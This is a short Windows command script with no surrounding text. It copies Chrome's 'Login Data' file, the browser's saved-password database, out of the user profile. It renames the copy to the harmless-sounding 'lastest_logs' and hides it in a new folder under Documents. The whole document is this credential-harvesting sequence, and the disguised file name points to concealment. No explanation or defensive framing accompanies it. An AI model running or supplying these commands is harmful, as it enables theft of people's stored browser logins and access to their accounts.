cd %localappdata%/Google/Chrome/
cd "User Data"/Default
copy "Login Data" %USERPROFILE%\Desktop
cd %USERPROFILE%\Desktop 
ren "Login Data" lastest_logs
cd %USERPROFILE%\Documents
mkdir cllg_logs
move %USERPROFILE%\Desktop\lastest_logs %USERPROFILE%\Documents\cllg_logs